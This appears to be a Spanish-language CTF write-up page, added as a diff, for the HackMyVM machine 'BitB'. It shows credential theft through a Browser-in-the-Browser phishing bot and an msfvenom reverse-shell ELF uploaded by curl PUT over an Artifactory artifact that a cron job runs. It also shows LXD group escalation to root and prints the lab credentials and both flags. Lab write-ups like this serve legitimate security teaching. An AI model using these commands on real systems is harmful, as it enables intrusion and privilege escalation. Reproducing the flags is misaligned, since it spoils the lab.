@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BitB · HackMyVM · W4lterSec</title>
+<meta name="description" content="Writeup visual de la máquina BITB (HackMyVM) — Browser-in-the-Browser, Artifactory cron RCE y LXD privesc.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;0,800;1,400&display=swap" rel="stylesheet">
+<style>
+:root{
+  --primary:#00FF41; --accent:#FF3333; --bg:#000000; --fg:#E0E0E0;
+  --card:#0C130E; --muted:#181818; --muted-fg:#94A3B8; --border:#1F2A20;
+  --glow:0 0 8px rgba(0,255,65,.55), 0 0 22px rgba(0,255,65,.25);
+  --glow-red:0 0 8px rgba(255,51,51,.55), 0 0 22px rgba(255,51,51,.25);
+  --sp-1:8px; --sp-2:16px; --sp-3:24px; --sp-4:40px; --sp-5:64px; --sp-6:96px;
+  --maxw:1000px;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0; background:var(--bg); color:var(--fg);
+  font-family:'JetBrains Mono',ui-monospace,SFMono-Regular,Menlo,monospace;
+  line-height:1.65; overflow-x:hidden; position:relative;
+}
+/* ---------- Aurora background (21st.dev-style) ---------- */
+.aurora{position:fixed; inset:0; z-index:-3; overflow:hidden; pointer-events:none}
+.aurora::before,.aurora::after{
+  content:""; position:absolute; width:60vmax; height:60vmax; border-radius:50%;
+  filter:blur(90px); opacity:.18; mix-blend-mode:screen;
+}
+.aurora::before{background:radial-gradient(circle,#00FF41,transparent 60%); top:-10%; left:-10%; animation:drift1 22s ease-in-out infinite}
+.aurora::after{background:radial-gradient(circle,#FF3333,transparent 60%); bottom:-15%; right:-10%; animation:drift2 26s ease-in-out infinite}
+@keyframes drift1{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(18vw,12vh) scale(1.25)}}
+@keyframes drift2{0%,100%{transform:translate(0,0) scale(1.1)}50%{transform:translate(-16vw,-10vh) scale(.85)}}
+/* ---------- Matrix rain canvas ---------- */
+#matrix{position:fixed; inset:0; z-index:-2; opacity:.10; pointer-events:none}
+/* ---------- Scanlines overlay ---------- */
+.scanlines{position:fixed; inset:0; z-index:9998; pointer-events:none;
+  background:repeating-linear-gradient(to bottom, rgba(0,0,0,0) 0 2px, rgba(0,0,0,.22) 2px 4px);
+  mix-blend-mode:multiply; opacity:.5;}
+.vignette{position:fixed; inset:0; z-index:9997; pointer-events:none;
+  background:radial-gradient(ellipse at center, transparent 55%, rgba(0,0,0,.65) 100%);}
+
+/* ---------- Layout ---------- */
+.wrap{max-width:var(--maxw); margin:0 auto; padding:0 var(--sp-2)}
+section{padding:var(--sp-5) 0; position:relative}
+.eyebrow{color:var(--primary); letter-spacing:.3em; text-transform:uppercase; font-size:.72rem; text-shadow:var(--glow); margin-bottom:var(--sp-2)}
+h2{font-size:clamp(1.3rem,3.4vw,2rem); margin:0 0 var(--sp-3); font-weight:800; letter-spacing:-.01em}
+h2 .n{color:var(--primary); text-shadow:var(--glow); margin-right:.5rem}
+h3{color:var(--primary); font-size:1.02rem; margin:var(--sp-3) 0 var(--sp-1); text-shadow:0 0 6px rgba(0,255,65,.3)}
+p{color:#cfd3cf}
+a{color:var(--primary)}
+
+/* ---------- HERO ---------- */
+.hero{min-height:100svh; display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center; padding:var(--sp-5) var(--sp-2); position:relative}
+.spotlight{position:absolute; inset:0; z-index:-1; background:radial-gradient(600px circle at 50% 30%, rgba(0,255,65,.10), transparent 60%)}
+.badge-live{display:inline-flex; align-items:center; gap:.5rem; border:1px solid var(--border); background:rgba(0,255,65,.05); padding:.35rem .8rem; border-radius:999px; font-size:.72rem; color:var(--primary); margin-bottom:var(--sp-3)}
+.dot{width:8px; height:8px; border-radius:50%; background:var(--primary); box-shadow:var(--glow); animation:pulse 1.6s ease-in-out infinite}
+@keyframes pulse{0%,100%{opacity:1; transform:scale(1)}50%{opacity:.4; transform:scale(.7)}}
+.glitch{font-size:clamp(2.6rem,11vw,6rem); font-weight:800; line-height:.95; letter-spacing:-.03em; position:relative; color:#fff; text-shadow:var(--glow)}
+.glitch::before,.glitch::after{content:attr(data-text); position:absolute; left:0; top:0; width:100%; overflow:hidden;}
+.glitch::before{color:var(--accent); clip-path:inset(0 0 55% 0); animation:gl1 2.6s infinite steps(2)}
+.glitch::after{color:var(--primary); clip-path:inset(55% 0 0 0); animation:gl2 2.1s infinite steps(2)}
+@keyframes gl1{0%,92%,100%{transform:translate(0)}93%{transform:translate(-3px,-1px)}96%{transform:translate(3px,1px)}}
+@keyframes gl2{0%,90%,100%{transform:translate(0)}91%{transform:translate(3px,1px)}97%{transform:translate(-3px,-1px)}}
+.subtitle{color:var(--muted-fg); max-width:620px; margin:var(--sp-3) auto 0; font-size:.98rem}
+.hero-meta{display:flex; flex-wrap:wrap; gap:.6rem; justify-content:center; margin-top:var(--sp-3)}
+.chip{border:1px solid var(--border); border-radius:999px; padding:.3rem .75rem; font-size:.74rem; color:var(--primary); background:rgba(0,255,65,.04)}
+.scroll-cue{position:absolute; bottom:var(--sp-3); left:50%; transform:translateX(-50%); color:var(--muted-fg); font-size:.7rem; animation:bob 2s ease-in-out infinite}
+@keyframes bob{0%,100%{transform:translate(-50%,0)}50%{transform:translate(-50%,8px)}}
+
+/* ---------- Shimmer gradient text ---------- */
+.shimmer{background:linear-gradient(90deg,#2a2a2a 0%,var(--primary) 50%,#2a2a2a 100%); background-size:200% auto; -webkit-background-clip:text; background-clip:text; color:transparent; animation:shim 4s linear infinite}
+@keyframes shim{to{background-position:-200% center}}
+
+/* ---------- Stat counters ---------- */
+.stats{display:grid; grid-template-columns:repeat(4,1fr); gap:var(--sp-2)}
+.stat{border:1px solid var(--border); border-radius:12px; background:var(--card); padding:var(--sp-3) var(--sp-2); text-align:center}
+.stat .num{font-size:clamp(1.6rem,5vw,2.4rem); font-weight:800; color:var(--primary); text-shadow:var(--glow)}
+.stat .lab{color:var(--muted-fg); font-size:.72rem; letter-spacing:.08em; text-transform:uppercase; margin-top:.3rem}
+
+/* ---------- Border-beam card (21st.dev signature) ---------- */
+.beam{position:relative; border-radius:14px; background:var(--card); border:1px solid var(--border); padding:var(--sp-3); overflow:hidden}
+.beam::before{content:""; position:absolute; inset:-1px; border-radius:inherit; padding:1px;
+  background:conic-gradient(from var(--a,0deg), transparent 0 70%, var(--primary) 85%, transparent 100%);
+  -webkit-mask:linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
+  -webkit-mask-composite:xor; mask-composite:exclude; animation:spin 5s linear infinite; opacity:.9}
+@property --a{syntax:'<angle>'; inherits:false; initial-value:0deg}
+@keyframes spin{to{--a:360deg}}
+.beam.red::before{background:conic-gradient(from var(--a,0deg), transparent 0 70%, var(--accent) 85%, transparent 100%)}
+
+/* ---------- Timeline (kill chain) ---------- */
+.timeline{position:relative; margin-top:var(--sp-3); padding-left:34px}
+.timeline::before{content:""; position:absolute; left:11px; top:6px; bottom:6px; width:2px; background:linear-gradient(var(--primary),transparent); box-shadow:var(--glow)}
+.tl{position:relative; margin-bottom:var(--sp-3)}
+.tl .ic{position:absolute; left:-34px; top:2px; width:24px; height:24px; border-radius:50%; background:var(--bg); border:2px solid var(--primary); display:grid; place-items:center; box-shadow:var(--glow); color:var(--primary); font-weight:800; font-size:.72rem}
+.tl h3{margin-top:0}
+.tl .meta{color:var(--muted-fg); font-size:.76rem}
+
+/* ---------- Terminal ---------- */
+.term{border:1px solid var(--border); border-radius:12px; background:#050805; overflow:hidden; box-shadow:0 20px 60px rgba(0,0,0,.6); margin:var(--sp-2) 0}
+.term .bar{display:flex; align-items:center; gap:.5rem; padding:.6rem .9rem; background:#0a0f0a; border-bottom:1px solid var(--border)}
+.term .bar i{width:11px; height:11px; border-radius:50%; display:inline-block}
+.term .bar .r{background:#ff5f56}.term .bar .y{background:#ffbd2e}.term .bar .g{background:#27c93f}
+.term .bar span{margin-left:auto; color:var(--muted-fg); font-size:.72rem}
+.term pre{margin:0; padding:var(--sp-2) var(--sp-3); font-size:.82rem; overflow-x:auto; color:#d6ffd9; white-space:pre-wrap; word-break:break-word}
+.term .p{color:var(--primary)} .term .c{color:#5a7a5f} .term .o{color:#cfd3cf} .term .w{color:var(--accent)}
+
+/* generic code */
+pre.code{border:1px solid var(--border); border-left:3px solid var(--primary); background:#060806; border-radius:8px; padding:var(--sp-2) var(--sp-3); overflow-x:auto; font-size:.82rem; color:#d6ffd9; white-space:pre-wrap; word-break:break-word}
+code.inl{background:var(--muted); padding:.1rem .4rem; border-radius:5px; color:var(--primary); font-size:.88em}
+
+/* ---------- Flag cards ---------- */
+.flags{display:grid; grid-template-columns:1fr 1fr; gap:var(--sp-2)}
+.flag{position:relative; border-radius:14px; padding:var(--sp-3); overflow:hidden; background:var(--card); border:1px solid var(--border)}
+.flag .lbl{font-size:.72rem; letter-spacing:.2em; text-transform:uppercase; color:var(--muted-fg)}
+.flag .val{font-size:clamp(.8rem,2.3vw,1.05rem); font-weight:700; margin-top:.5rem; word-break:break-all}
+.flag.user .val{color:var(--primary); text-shadow:var(--glow)}
+.flag.root .val{color:var(--accent); text-shadow:var(--glow-red)}
+
+/* ---------- reveal ---------- */
+.reveal{opacity:0; transform:translateY(28px)}
+.note{border-left:3px solid var(--accent); background:rgba(255,51,51,.06); padding:var(--sp-2) var(--sp-3); border-radius:0 8px 8px 0; margin:var(--sp-2) 0; color:#ffd7d7; font-size:.9rem}
+
+footer{border-top:1px solid var(--border); padding:var(--sp-4) 0; text-align:center; color:var(--muted-fg); font-size:.78rem}
+
+@media(max-width:720px){
+  .stats{grid-template-columns:repeat(2,1fr)}
+  .flags{grid-template-columns:1fr}
+  section{padding:var(--sp-4) 0}
+}
+@media(prefers-reduced-motion:reduce){
+  *{animation:none!important; transition:none!important}
+  .reveal{opacity:1; transform:none}
+  html{scroll-behavior:auto}
+}
+
+/* Portfolio navigation and accessible flag controls. */
+.portfolio-nav{position:relative;display:flex;align-items:center;justify-content:center;flex-wrap:wrap;gap:12px 24px;max-width:100%;margin:0 0 38px;font-size:14px;line-height:1.6}
+.portfolio-nav span{color:var(--muted-fg)}
+.portfolio-nav a{text-decoration:none}.portfolio-nav a:hover{text-decoration:underline;text-underline-offset:4px}
+.beam::before,.glitch::before,.glitch::after{pointer-events:none}
+.flag .val{user-select:text;-webkit-user-select:text;cursor:text}
+.flagcopy{display:inline-flex;align-items:center;justify-content:center;min-height:44px;margin-top:18px;padding:9px 15px;border:1px solid var(--primary);border-radius:8px;background:#0a180e;color:var(--primary);font:14px 'JetBrains Mono',Consolas,monospace;cursor:pointer;position:relative}
+.flagcopy:hover{background:#102819}.flagcopy:focus-visible,.portfolio-nav a:focus-visible{outline:2px solid var(--primary);outline-offset:5px}
+.flag.root .flagcopy{border-color:var(--accent);color:#ff8383;background:#1b0d0d}
+.copy-status{min-height:1.6em;margin-top:16px;color:var(--muted-fg);font-size:14px}
+.portfolio-actions{margin:24px 0 0;display:flex;flex-wrap:wrap;gap:12px;justify-content:center;font-size:14px}
+.portfolio-actions a{display:inline-block;padding:8px 13px;border:1px solid var(--border);border-radius:6px;background:var(--card);text-decoration:none}
+@media(max-width:720px){.hero{padding-top:32px;padding-bottom:72px;min-height:100svh}.portfolio-nav{margin-bottom:30px;gap:12px 18px}.portfolio-nav span{flex-basis:100%;order:-1}}
+@media print{#matrix,.aurora,.scanlines,.vignette,.flagcopy,.copy-status,.scroll-cue{display:none!important}.reveal{opacity:1!important;transform:none!important}.hero{min-height:auto}section{padding:24px 0}}
+</style>
+<noscript><style>.reveal{opacity:1;transform:none}</style></noscript>
+</head>
+<body>
+<div class="aurora"></div>
+<canvas id="matrix"></canvas>
+<div class="scanlines"></div>
+<div class="vignette"></div>
+
+<!-- ============ HERO ============ -->
+<header class="hero">
+<nav class="portfolio-nav" aria-label="Navegación del portfolio">
+  <a href="https://github.com/W4lterSec/cybersecurity-labs/tree/main/red-team">Red Team</a>
+  <span>💻 W4lterSec · BitB · HackMyVM</span>
+  <a href="https://downloads.hackmyvm.eu/bitb.zip">Descargar máquina oficial</a>
+</nav>
+  <div class="spotlight"></div>
+  <div class="badge-live"><span class="dot"></span> TARGET 192.168.1.32 · ROOTED</div>
+  <h1 class="glitch" data-text="BITB">BITB</h1>
+  <p class="subtitle"><span class="shimmer">Bored in the Business</span> — HackMyVM. Un recorrido de explotación: Browser-in-the-Browser → Artifactory → Cron RCE → LXD privesc.</p>
+  <div class="hero-meta">
+    <span class="chip">SMTP SSRF</span>
+    <span class="chip">BitB Phishing</span>
+    <span class="chip">Artifactory PUT</span>
+    <span class="chip">Cron RCE</span>
+    <span class="chip">LXD root</span>
+  </div>
+  <div class="portfolio-actions"><a href="#recon">Leer writeup</a><a href="#flags">Ver flags</a></div>
+  <div class="scroll-cue">▼ scroll</div>
+</header>
+
+<main class="wrap">
+
+  <!-- ============ STATS ============ -->
+  <section>
+    <div class="stats">
+      <div class="stat reveal"><div class="num" data-count="2">0</div><div class="lab">Puertos abiertos</div></div>
+      <div class="stat reveal"><div class="num" data-count="3">0</div><div class="lab">Usuarios pivotados</div></div>
+      <div class="stat reveal"><div class="num" data-count="5">0</div><div class="lab">Fases kill-chain</div></div>
+      <div class="stat reveal"><div class="num" data-count="2">0</div><div class="lab">Flags capturadas</div></div>
+    </div>
+  </section>
+
+  <!-- ============ RECON ============ -->
+  <section id="recon">
+    <div class="eyebrow reveal">// Fase 01</div>
+    <h2 class="reveal"><span class="n">01</span>Reconocimiento</h2>
+    <p class="reveal">Sólo dos puertos. La web expone al usuario <code class="inl">luke.alike</code> y el mensaje clave: <em>"send us an email providing the details of where we should log on"</em>.</p>
+    <div class="term reveal">
+      <div class="bar"><i class="r"></i><i class="y"></i><i class="g"></i><span>nmap</span></div>
+      <pre><span class="p">$</span> nmap -p- --min-rate 3000 -Pn 192.168.1.32
+<span class="o">25/tcp open  smtp    Postfix smtpd (bitb.hmv)
+80/tcp open  http    Apache httpd 2.4.66 (Ubuntu)</span></pre>
+    </div>
+    <div class="note reveal">⚠️ <strong>Rabbit hole:</strong> el portal de login y la web devuelven <strong>códigos y tamaños aleatorios</strong> para la misma petición — anti-fuzzing deliberado que enmascara el endpoint <code class="inl">/artifactory/</code>.</div>
+  </section>
+
+  <!-- ============ BITB ============ -->
+  <section id="bitb">
+    <div class="eyebrow reveal">// Fase 02</div>
+    <h2 class="reveal"><span class="n">02</span>Browser-in-the-Browser → credenciales</h2>
+    <p class="reveal">Un bot procesa el correo de <code class="inl">luke.alike</code> y hace <code class="inl">curl</code> a la primera URL. Si la página contiene <em>hooks</em> BitB (<code class="inl">data-server-url</code>, <code class="inl">stealCredentials</code>, <code class="inl">bitbWindow</code>), <strong>simula el login y nos POSTea las credenciales de luke</strong>.</p>
+    <div class="beam reveal">
+      <h3>El bot entrega:</h3>
+      <pre class="code">POST /log  →  {
+  "username": "luke.alike@bitb.hmv",
+  "password": "BrowserInTheBrowserAttack"
+}</pre>
+    </div>
+  </section>
+
+  <!-- ============ FOOTHOLD ============ -->
+  <section id="foothold">
+    <div class="eyebrow reveal">// Fase 03</div>
+    <h2 class="reveal"><span class="n">03</span>Foothold — Artifactory + Cron RCE</h2>
+    <p class="reveal">Las credenciales abren un <strong>Artifactory</strong> en <code class="inl">/artifactory/</code> que acepta <strong>PUT</strong>. Un cron de <code class="inl">abidle</code> descarga y <strong>ejecuta</strong> el artefacto <code class="inl">bored_business_yield_engine.elf</code> cada 300s. Lo reemplazamos por una reverse shell.</p>
+    <div class="term reveal">
+      <div class="bar"><i class="r"></i><i class="y"></i><i class="g"></i><span>exploit</span></div>
+<pre><span class="c"># 1) reverse shell ELF</span>
+<span class="p">$</span> msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.29 LPORT=2222 \
+      -f elf -o bored_business_yield_engine.elf
+
+<span class="c"># 2) sobrescribir el artefacto (auth luke)</span>
+<span class="p">$</span> curl -X PUT http://bitb.hmv/artifactory/libs-release-local/bored_business_yield_engine.elf \
+      --data-binary @bored_business_yield_engine.elf \
+      -u 'luke.alike@bitb.hmv:BrowserInTheBrowserAttack'
+<span class="o">HTTP/1.1 201 Created</span>
+
+<span class="c"># 3) el cron lo ejecuta → shell</span>
+<span class="p">$</span> nc -lvnp 2222
+<span class="o">connect from 192.168.1.32 ...</span>
+<span class="p">$</span> id
+<span class="o">uid=1000(abidle) groups=...,adm,sudo,</span><span class="w">lxd</span></pre>
+    </div>
+  </section>
+
+  <!-- ============ USER ============ -->
+  <section id="user">
+    <div class="eyebrow reveal">// Fase 04</div>
+    <h2 class="reveal"><span class="n">04</span>Flag de usuario</h2>
+    <p class="reveal">La contraseña capturada es también la de sistema de <code class="inl">lalike</code> (luke):</p>
+    <pre class="code reveal"><span style="color:var(--primary)">$</span> su lalike        <span style="color:#5a7a5f"># BrowserInTheBrowserAttack</span>
+<span style="color:var(--primary)">$</span> cat ~/user.txt</pre>
+  </section>
+
+  <!-- ============ PRIVESC ============ -->
+  <section id="root">
+    <div class="eyebrow reveal">// Fase 05</div>
+    <h2 class="reveal"><span class="n">05</span>Privesc → root (grupo lxd)</h2>
+    <p class="reveal"><code class="inl">abidle</code> está en el grupo <strong>lxd</strong>. El CLI snap falla por falta de sesión, pero el binario real funciona. Montamos un contenedor <strong>privilegiado</strong> con el <code class="inl">/</code> del host.</p>
+    <div class="term reveal">
+      <div class="bar"><i class="r"></i><i class="y"></i><i class="g"></i><span>lxd-privesc</span></div>
+<pre><span class="c"># bypass del snap roto</span>
+<span class="p">$</span> L(){ LXD_DIR=/var/snap/lxd/common/lxd /snap/lxd/current/bin/lxc "$@"; }
+
+<span class="p">$</span> L image import alpine-lxd.tar.gz --alias pwnimg
+<span class="p">$</span> L storage create pwnpool dir
+<span class="p">$</span> L profile device add default root disk pool=pwnpool path=/
+<span class="p">$</span> L init pwnimg pwnc -c security.privileged=true
+<span class="p">$</span> L config device add pwnc hostroot disk source=/ path=/mnt/host recursive=true
+<span class="p">$</span> L start pwnc
+<span class="p">$</span> L exec pwnc -- sh -c 'cat /mnt/host/root/root.txt'
+<span class="o">uid=0(root) → </span><span class="w">ROOT</span></pre>
+    </div>
+  </section>
+
+  <!-- ============ FLAGS ============ -->
+  <section id="flags">
+    <div class="eyebrow reveal">// Loot</div>
+    <h2 class="reveal"><span class="n">★</span>Flags capturadas</h2>
+    <div class="flags">
+      <div class="flag user beam reveal">
+        <div class="lbl">User flag</div>
+        <div class="val" id="user-flag">HMV{I-used-a-bitb-attack-to-get-credentials}</div>
+        <button type="button" class="flagcopy" data-copy="HMV{I-used-a-bitb-attack-to-get-credentials}" data-copy-target="user-flag" aria-label="Copiar flag de usuario">Copiar flag</button>
+      </div>
+      <div class="flag root beam red reveal">
+        <div class="lbl">Root flag</div>
+        <div class="val" id="root-flag">HMV{You_h4c3d_BITB!_congratsz}</div>
+        <button type="button" class="flagcopy" data-copy="HMV{You_h4c3d_BITB!_congratsz}" data-copy-target="root-flag" aria-label="Copiar flag de root">Copiar flag</button>
+      </div>
+    </div>
+    <p class="copy-status" id="copy-status" role="status" aria-live="polite" aria-atomic="true"></p>
+  </section>
+
+  <!-- ============ KILL CHAIN ============ -->
+  <section id="chain">
+    <div class="eyebrow reveal">// Timeline</div>
+    <h2 class="reveal"><span class="n">⛓</span>Kill chain</h2>
+    <div class="timeline">
+      <div class="tl reveal"><div class="ic">1</div><h3>Recon</h3><p class="meta">SMTP + HTTP · usuario luke.alike · portal troll anti-fuzzing</p></div>
+      <div class="tl reveal"><div class="ic">2</div><h3>Credenciales</h3><p class="meta">Phishing BitB vía SMTP → el bot entrega luke.alike:BrowserInTheBrowserAttack</p></div>
+      <div class="tl reveal"><div class="ic">3</div><h3>Foothold</h3><p class="meta">Artifactory PUT (auth) → cron de abidle ejecuta el ELF → RCE</p></div>
+      <div class="tl reveal"><div class="ic">4</div><h3>User</h3><p class="meta">su lalike (misma password) → user.txt</p></div>
+      <div class="tl reveal"><div class="ic">5</div><h3>Root</h3><p class="meta">Grupo lxd → contenedor privilegiado monta / del host → root.txt</p></div>
+    </div>
+  </section>
+
+  <!-- ============ LESSONS ============ -->
+  <section id="lessons">
+    <div class="eyebrow reveal">// Takeaways</div>
+    <h2 class="reveal"><span class="n">λ</span>Lecciones</h2>
+    <div style="display:grid; gap:var(--sp-2)">
+      <div class="beam reveal"><strong style="color:var(--primary)">Respuestas erráticas = troll.</strong> El ruido aleatorio enmascaraba <code class="inl">/artifactory/</code>. No descartes rutas por el fuzzing.</div>
+      <div class="beam reveal"><strong style="color:var(--primary)">El SSRF ciego era secundario.</strong> La clave era el flujo de negocio BitB que entrega credenciales.</div>
+      <div class="beam reveal"><strong style="color:var(--primary)">Repo de artefactos + cron = RCE.</strong> Sobrescribir un binario que un cron ejecuta es RCE directo.</div>
+      <div class="beam reveal"><strong style="color:var(--primary)">Grupo lxd = root.</strong> Aun con el CLI snap roto, el binario real / la API del socket escalan.</div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">BITB · 192.168.1.32 · rooted (user + root) · writeup autorizado<br>
+  <span style="color:var(--primary)">HMV{You_h4c3d_BITB!_congratsz}</span></div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/ScrollTrigger.min.js"></script>
+<script>
+(function(){
+  var reduce = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+  /* ---- copy buttons ---- */
+  var copyStatus = document.getElementById('copy-status');
+  function legacyCopy(value){
+    var active = document.activeElement;
+    var field = document.createElement('textarea');
+    field.value = value;
+    field.setAttribute('readonly', '');
+    field.style.cssText = 'position:fixed;left:-9999px;top:0;opacity:0';
+    document.body.appendChild(field);
+    field.focus({preventScroll:true});
+    field.select();
+    field.setSelectionRange(0, value.length);
+    var copied = false;
+    try { copied = document.execCommand('copy'); } catch(error) {}
+    field.remove();
+    if(active && typeof active.focus === 'function') active.focus({preventScroll:true});
+    return copied;
+  }
+  async function copyText(value){
+    if(navigator.clipboard && window.isSecureContext){
+      try { await navigator.clipboard.writeText(value); return true; } catch(error) {}
+    }
+    return legacyCopy(value);
+  }
+  document.querySelectorAll('button[data-copy]').forEach(function(b){
+    var originalLabel = b.textContent;
+    var resetTimer;
+    b.addEventListener('click', async function(){
+      clearTimeout(resetTimer);
+      var value = b.getAttribute('data-copy');
+      var copied = await copyText(value);
+      var targetId = b.getAttribute('data-copy-target');
+      if(copied){
+        b.textContent = targetId ? '✓ Copiada' : '✓ copiado';
+        copyStatus.textContent = targetId === 'user-flag' ? 'Flag de usuario copiada.' : targetId === 'root-flag' ? 'Flag de root copiada.' : 'Comando copiado.';
+      } else {
+        var target = targetId && document.getElementById(targetId);
+        if(target){
+          var range = document.createRange();
+          range.selectNodeContents(target);
+          var selection = window.getSelection();
+          selection.removeAllRanges();
+          selection.addRange(range);
+        }
+        b.textContent = target ? 'Texto seleccionado' : 'No se pudo copiar';
+        copyStatus.textContent = target ? 'La flag está seleccionada. Pulsa Ctrl+C o usa la opción Copiar de tu dispositivo.' : 'Selecciona el comando y usa la opción Copiar de tu dispositivo.';
+      }
+      resetTimer = setTimeout(function(){ b.textContent = originalLabel; }, 2200);
+    });
+  });
+
+
+  /* ---- Matrix rain ---- */
+  (function(){
+    var c=document.getElementById('matrix'), x=c.getContext('2d');
+    var chars='アイウエオカキクケコ01BITB</>#$_'.split(''), fs=14, cols, drops;
+    function resize(){ c.width=innerWidth; c.height=innerHeight; cols=Math.floor(c.width/fs); drops=Array(cols).fill(1); }
+    resize(); addEventListener('resize', resize);
+    if(reduce) return;
+    function draw(){
+      x.fillStyle='rgba(0,0,0,.08)'; x.fillRect(0,0,c.width,c.height);
+      x.fillStyle='#00FF41'; x.font=fs+'px monospace';
+      for(var i=0;i<drops.length;i++){
+        x.fillText(chars[Math.floor(Math.random()*chars.length)], i*fs, drops[i]*fs);
+        if(drops[i]*fs>c.height && Math.random()>0.975) drops[i]=0;
+        drops[i]++;
+      }
+    }
+    setInterval(draw,55);
+  })();
+
+  /* ---- Border-beam rotation fallback (for browsers w/o @property) ---- */
+
+  if(reduce || !window.gsap || !window.ScrollTrigger){ document.querySelectorAll('.reveal').forEach(function(e){e.style.opacity=1;e.style.transform='none';});
+    document.querySelectorAll('[data-count]').forEach(function(e){e.textContent=e.getAttribute('data-count');}); return; }
+
+  gsap.registerPlugin(ScrollTrigger);
+
+  /* ---- Scroll reveal (stagger) ---- */
+  gsap.utils.toArray('.reveal').forEach(function(el){
+    gsap.to(el,{opacity:1,y:0,duration:.7,ease:'power3.out',
+      scrollTrigger:{trigger:el,start:'top 88%'}});
+  });
+
+  /* ---- Number tickers ---- */
+  gsap.utils.toArray('[data-count]').forEach(function(el){
+    var end=+el.getAttribute('data-count'), obj={v:0};
+    ScrollTrigger.create({trigger:el,start:'top 90%',once:true,onEnter:function(){
+      gsap.to(obj,{v:end,duration:1.4,ease:'power2.out',onUpdate:function(){el.textContent=Math.round(obj.v);}});
+    }});
+  });
+
+  /* ---- Hero parallax on scroll ---- */
+  gsap.to('.glitch',{yPercent:-18,opacity:.25,ease:'none',
+    scrollTrigger:{trigger:'.hero',start:'top top',end:'bottom top',scrub:true}});
+})();
+</script>
+</body>
+</html>
